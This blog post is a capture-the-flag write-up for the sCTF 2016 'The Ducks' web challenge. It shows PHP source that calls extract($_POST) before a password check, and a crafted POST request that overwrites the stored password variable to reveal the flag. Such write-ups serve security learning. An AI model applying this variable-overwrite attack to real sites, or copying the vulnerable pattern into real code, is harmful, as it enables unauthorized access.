---
layout: post
title: "sCTF 2016 Q1 : The Ducks"
author: dade
date: 2016-05-10 16:19:00 -0700
slug: ducks
category:
- 2016
- sctf-q1
---
**Category:** Web
**Points:** 30
**Description:** 

> [The ducks](http://ducks.sctf.michaelz.xyz) and I have an unfinished score to settle.

# Investigation
The ducks is a seemingly boring site, only prompting us for a password. But they are kind enough to provide us the source.php document, which shows us the entire source code for the page.

```php
<?php
include("secret.php");
?>
<html>
    <head>
        <title>The Ducks</title>
        <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1q8mTJOASx8j1Au+a5WDVnPi2lkFfwwEAa8hDDdjZlpLegxhjVME1fgjWPGmkzs7" crossorigin="anonymous">
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.6/js/bootstrap.min.js" integrity="sha384-0mSbJDEHialfmuBBQP6A4Qrprq5OVfW37PRR3j5ELqxss1yVqOtnepnHVP9aJ7xS" crossorigin="anonymous"></script>
    </head>
    <body>
        <div class="container">
            <div class="jumbotron">
                <center>
                    <h1>The Ducks</h1>
                    <?php if ($_SERVER["REQUEST_METHOD"] == "POST") { ?>
                        <?php
                        extract($_POST);
                        if ($pass == $thepassword_123) { ?>
                            <div class="alert alert-success">
                                <code><?php echo $theflag; ?></code>
                            </div>
                        <?php } ?>
                    <?php } ?>
                    <form action="." method="POST">
                        <div class="row">
                            <div class="col-md-6 col-md-offset-3">
                                <div class="row">
                                    <div class="col-md-9">
                                        <input type="password" class="form-control" name="pass" placeholder="Password" />
                                    </div>
                                    <div class="col-md-3">
                                        <input type="submit" class="btn btn-primary" value="Submit" />
                                    </div>
                                </div>
                            </div>
                        </div>
                    </form>
                </center>
            </div>
            <p>
                <center>
                    source at <a href="source.php" target="_blank">/source.php</a>
                </center>
            </p>
        </div>
    </body>
</html>
```

In source.php we see an if statement that runs if our HTTP verb was POST. Then it extracts the variables from $_POST. Then it compares our $pass variable with the value of $thepassword_123, and if they are equal it will echo us out the flag! We just need to make those two values equal. Luckily, it appears to indiscriminately extract variables from $_POST, so we whip out a tool (Fiddler) to manually send a POST request.

# Solution
Instead of just submitting the $pass variable in the body of our POST, let's also submit $thepassword_123. So our POST looks something like

```
	POST http://ducks.sctf.michaelz.xyz HTTP/1.1
	Host: http://ducks.sctf.michaelz.xyz
	Content-Type: application/x-www-form-urlencoded;

	pass=Easyas123&thepassword_123=Easyas123
```

Now we can see what we got back from the server, and under the The Ducks header, we have an alert with the flag in it!

# Flag
```
sctf{maybe_i_shouldn't_have_extracted_everything_huh}
```
